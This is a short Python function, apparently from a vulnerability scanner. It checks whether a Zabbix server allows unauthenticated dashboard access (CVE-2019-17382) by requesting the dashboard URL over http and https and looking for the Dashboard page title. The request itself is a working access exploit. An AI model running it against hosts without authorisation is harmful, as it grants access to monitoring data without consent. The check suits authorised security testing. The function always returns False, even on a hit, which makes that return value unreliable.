import requests
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def check_CVE_2019_17382(ip, port=None):
    path = "/zabbix.php?action=dashboard.view&dashboardid=1"
    protocols = ["http", "https"]
    ports = [f":{port}" if port else ""]
    for protocol in protocols:
        for port_suffix in ports:
            try:
                url = f"{protocol}://{ip}{port_suffix}{path}"
                response = requests.get(url, timeout=5, verify=False)
                if "<title>Dashboard</title>" in response.text:
                    print_green(f"The target is vulnerable to CVE-2019-17382 : {url}")
            except requests.RequestException:
                continue
    return False
